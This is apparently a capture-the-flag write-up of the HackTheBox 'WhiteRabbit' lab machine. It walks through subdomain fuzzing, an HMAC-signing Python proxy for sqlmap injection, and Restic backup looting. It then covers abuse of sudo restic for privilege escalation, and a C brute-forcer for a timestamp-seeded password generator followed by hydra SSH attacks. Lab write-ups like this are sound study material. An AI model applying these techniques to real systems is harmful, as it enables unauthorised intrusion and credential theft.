---
title: "HackTheBox WhiteRabbit Writeup - Insane Linux Machine"
description: "Complete walkthrough of HackTheBox WhiteRabbit machine by Wathsala Dewmina (PwnedCake). An Insane-level Linux machine featuring Uptime Kuma enumeration, HMAC-signed SQL injection bypass, Restic backup abuse for privilege escalation, and password generator reverse engineering."
author: Wathsala Dewmina
date: 2025-06-03 13:00:00 +0530
categories: [HackTheBox, Insane]
tags: [htb, uptime-kuma, sqli, hmac, restic, reverse-engineering, docker, ssh, linux, privilege-escalation, penetration-testing]
pin: false
image:
  path: /assets/img/htb-whiterabbit/image.png
  alt: HackTheBox WhiteRabbit Machine Writeup by PwnedCake
keywords:
  - HackTheBox WhiteRabbit
  - WhiteRabbit Writeup
  - HTB WhiteRabbit
  - HMAC SQL Injection
  - Restic Backup Abuse
  - Linux Privilege Escalation
  - Uptime Kuma Exploit
  - PwnedCake Writeup
  - Wathsala Dewmina
---

## Machine Information

| Attribute | Details |
|:----------|:--------|
| **Machine Name** | WhiteRabbit |
| **Difficulty** | Insane |
| **OS** | Linux |
| **IP Address** | 10.129.75.14 |

---

## Reconnaissance

### Nmap Scan

Starting with a quick Nmap scan:

```bash
nmap -sCV -T5 --min-rate 2000 -v -oN whiterabbit.nmap 10.129.75.14
```

**Scan Results:**

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9
80/tcp open  http    Caddy httpd
|_http-title: Did not follow redirect to http://whiterabbit.htb
```

### Key Findings

- **SSH (Port 22)**: OpenSSH 9.6p1 running on Ubuntu
- **HTTP (Port 80)**: Caddy web server redirecting to `whiterabbit.htb`

Let's add the domain to our hosts file and enumerate further.

---

## Subdomain Enumeration

Using ffuf to find subdomains:

```bash
ffuf -H "Host: FUZZ.whiterabbit.htb" -c -ic -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://whiterabbit.htb -fs 0
```

```text
status                  [Status: 302, Size: 32, Words: 4, Lines: 1]
```

Found `status.whiterabbit.htb`. After adding it to `/etc/hosts`, we can visit the page.

![Uptime Kuma Status Page](/assets/img/htb-whiterabbit/image.png)
_Uptime Kuma status monitoring page_

I did some research on this and found an interesting GitHub issue about Uptime Kuma having a `/status` directory. Let's fuzz for more paths:

```bash
ffuf -ic -c -u http://status.whiterabbit.htb/status/FUZZ -w /opt/SecLists/Discovery/Web-Content/common.txt -fs 2444
```

```text
temp                    [Status: 200, Size: 3359]
```

Found `/status/temp`. Let's check it out.

![Status Temp Page](/assets/img/htb-whiterabbit/image%201.png)
_The temp status page showing multiple services_

This revealed several internal services:
- GoPhish
- n8n
- Website
- WikiJS

After adding these to our hosts file and visiting the WikiJS endpoint, I found a webhook URL.

![WikiJS Webhook](/assets/img/htb-whiterabbit/image%202.png)
_Webhook pointing to another subdomain_

Following the redirect leads us to an n8n workflow page.

![n8n Page](/assets/img/htb-whiterabbit/image%203.png)
_n8n automation workflow interface_

---

## SQL Injection via HMAC Proxy

While investigating, I found some interesting POST requests going to a database.

![Database POST Request](/assets/img/htb-whiterabbit/image%204.png)
_POST request communicating with a database_

In the webhook configuration, I found a GoPhish phishing score database JSON file.

![GoPhish JSON](/assets/img/htb-whiterabbit/image%205.png)
_GoPhish configuration with sensitive data_

And here's the juicy part - an HMAC secret:

```bash
cat gophish_to_phishing_score_database.json | grep secret
        "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6
```

### The HMAC Problem

Here's the thing: the server uses HMAC signatures to validate requests. All requests must be signed with the secret key, otherwise they get rejected. This means we can't just fire up SQLMap directly because our payloads won't be signed.

To solve this, I wrote a Python proxy that intercepts requests, signs them with the HMAC value, and forwards them to the target server:

```python
#!/usr/bin/env python3
"""
HMAC Proxy for GoPhish SQLMap automation
"""

import hashlib
import hmac
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.request
import urllib.parse
import sys

class HMACProxyHandler(BaseHTTPRequestHandler):
    SECRET_KEY = "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
    TARGET_HOST = "28efa8f7df.whiterabbit.htb"

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)

        # Generate HMAC signature
        signature = hmac.new(
            self.SECRET_KEY.encode('utf-8'),
            post_data,
            digestmod=hashlib.sha256
        ).hexdigest()

        headers = {
            'Content-Type': self.headers.get('Content-Type', 'application/json'),
            'x-gophish-signature': f'sha256={signature}',
            'User-Agent': self.headers.get('User-Agent', 'sqlmap'),
        }

        try:
            target_url = f"http://{self.TARGET_HOST}{self.path}"
            req = urllib.request.Request(
                target_url,
                data=post_data,
                headers=headers,
                method='POST'
            )

            with urllib.request.urlopen(req) as response:
                response_data = response.read()
                self.send_response(response.getcode())
                for header, value in dict(response.headers).items():
                    if header.lower() not in ['connection', 'transfer-encoding']:
                        self.send_header(header, value)
                self.end_headers()
                self.wfile.write(response_data)

        except Exception as e:
            self.send_error(500, str(e))

def run_proxy(port=8888):
    server = HTTPServer(('127.0.0.1', port), HMACProxyHandler)
    print(f"HMAC Proxy running on port {port}")
    server.serve_forever()

if __name__ == "__main__":
    run_proxy()
```

---

## Initial Access

### Exploiting SQL Injection

With the proxy running, we can now use SQLMap:

![HMAC Proxy Running](/assets/img/htb-whiterabbit/image%206.png)
_HMAC proxy ready to sign our requests_

```bash
sqlmap -u "http://127.0.0.1:8888/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \
  --method POST \
  --data '{"campaign_id":2,"email":"test@mail.com","message":"Clicked Link"}' \
  -p email --batch --dump --level=5 --risk=3 --dbs
```

![SQLMap Databases](/assets/img/htb-whiterabbit/image%207.png)
_Found three databases_

We found three databases: `information_schema`, `phishing`, and `temp`. Let's dump the temp database:

```bash
sqlmap -u "http://127.0.0.1:8888/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \
  --method POST \
  --data '{"campaign_id":2,"email":"test@mail.com","message":"Clicked Link"}' \
  -p email --batch --dump --level=5 --risk=3 -D temp
```

![Temp Database](/assets/img/htb-whiterabbit/image%208.png)
_Command log from the temp database_

This gave us a command_log with some interesting entries:

```text
+----+---------------------+------------------------------------------------------------------------------+
| id | date                | command                                                                      |
+----+---------------------+------------------------------------------------------------------------------+
| 1  | 2024-08-30 10:44:01 | uname -a                                                                     |
| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |
| 3  | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd                       |
| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                                         |
| 5  | 2024-08-30 11:59:47 | #thatwasclose                                                                |
| 6  | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |
+----+---------------------+------------------------------------------------------------------------------+
```

This is gold! We have a Restic password and a URL.

### Restic Backup Enumeration

Let's access the Restic snapshots:

```bash
export RESTIC_PASSWORD=ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw
restic -r rest:http://75951e6ff.whiterabbit.htb snapshots
```

![Restic Snapshots](/assets/img/htb-whiterabbit/image%209.png)
_Found Bob's SSH folder in a snapshot_

We can restore Bob's SSH folder:

```bash
restic restore 272cacd5 --target . --path /dev/shm/bob/ssh -r rest:http://75951e6ff.whiterabbit.htb
```

Inside we find a password-protected 7z file. Let's crack it:

```bash
7z2john bob.7z > bob.hash
hashcat bob.hash /usr/share/wordlists/rockyou.txt -m 11600 --user
```

```text
$7z$...:1q2w3e4r5t6y
```

After extracting with the password `1q2w3e4r5t6y`, we get Bob's SSH private key and config:

```text
Host whiterabbit
  HostName whiterabbit.htb
  Port 2222
  User bob
```

Port 2222 is running SSH. Let's connect:

```bash
ssh bob@whiterabbit.htb -p 2222 -i id_rsa_bob
```

We're in as bob, but we're in a Docker container.

---

## Privilege Escalation

### Restic Abuse

Checking sudo permissions:

```bash
bob@ebdce80611e9:~$ sudo -l
User bob may run the following commands on ebdce80611e9:
    (ALL) NOPASSWD: /usr/bin/restic
```

We can run restic as root. Let's abuse this to backup and extract root's files:

```bash
# Create a local repo
sudo /usr/bin/restic init -r .

# Backup /root
sudo /usr/bin/restic -r . backup /root/

# List the backup
sudo /usr/bin/restic -r . ls latest

# Dump morpheus SSH key
sudo restic -r . dump latest /root/morpheus
```

This gives us Morpheus's SSH private key. Now we can SSH to the main host as morpheus.

### Reverse Engineering the Password Generator

Remember the command log entry about `neo-password-generator`? Let's download and reverse engineer it.

After analyzing it in Ghidra, the binary:
1. Uses `gettimeofday` to get a timestamp in milliseconds
2. Seeds the C `rand()` function with this value
3. Generates a 20-character password from the charset `a-zA-Z0-9`

From the log, we know neo ran it on `2024-08-30 14:40:42 UTC`. I wrote a C script to generate all possible passwords:

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

void generate_password(unsigned int seed) {
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    char password[21];
    srand(seed);
    for (int i = 0; i < 20; i++) {
        password[i] = charset[rand() % 62];
    }
    password[20] = '\0';
    printf("Seed: %u, Password: %s\n", seed, password);
}

int main() {
    unsigned long long base_seed = 1725028842ULL * 1000;
    for (int microseconds = 0; microseconds < 1000; microseconds++) {
        unsigned int seed = (unsigned int)(base_seed + microseconds);
        generate_password(seed);
    }
    return 0;
}
```

After generating the wordlist, we brute-force:

```bash
hydra -l neo -P passwords_only.txt ssh://whiterabbit.htb -t 5
```

```text
[22][ssh] host: whiterabbit.htb   login: neo   password: WBSxhWgfnMiclrV4dqfj
```

### Root Access

Let's check neo's privileges:

```bash
neo@whiterabbit:~$ sudo -l
User neo may run the following commands on whiterabbit:
    (ALL : ALL) ALL

neo@whiterabbit:~$ sudo su
root@whiterabbit:/home/neo# whoami
root
```

> **Root Flag Captured!**
{: .prompt-tip }

---

## Key Takeaways

### Vulnerabilities Exploited

1. **HMAC-Signed SQL Injection**
   - Bypassed HMAC validation using a custom proxy
   - Extracted sensitive data from the database

2. **Restic Backup Abuse**
   - Used sudo permissions to backup and extract root files
   - Retrieved SSH keys from backup snapshots

3. **Weak Password Generation**
   - Predictable seed (timestamp-based)
   - Allowed brute-forcing the password space

### Lessons Learned

> Timestamp-based seeding for cryptographic operations is weak. Use proper entropy sources like `/dev/urandom`.
{: .prompt-warning }

> HMAC validation doesn't help if the secret is exposed. Keep secrets out of configuration files that may be accessible.
{: .prompt-danger }

---

## Tools Used

- **Nmap** - Port scanning
- **ffuf** - Subdomain and directory fuzzing
- **SQLMap** - SQL injection exploitation
- **Hashcat** - Password cracking
- **Restic** - Backup enumeration
- **Ghidra** - Binary reverse engineering
- **Hydra** - SSH brute-forcing

---

## Conclusion

WhiteRabbit was an amazing machine that required creative thinking at every step. The HMAC proxy for SQLi was a fun problem to solve, and the password generator reverse engineering was a nice touch. The Docker escape through Restic abuse showed how backup tools with elevated privileges can be dangerous.

**Final Stats:**
- Time to User: ~3 hours
- Time to Root: ~1 hour
- Difficulty Rating: Insane

Thanks for reading! Happy Hacking!
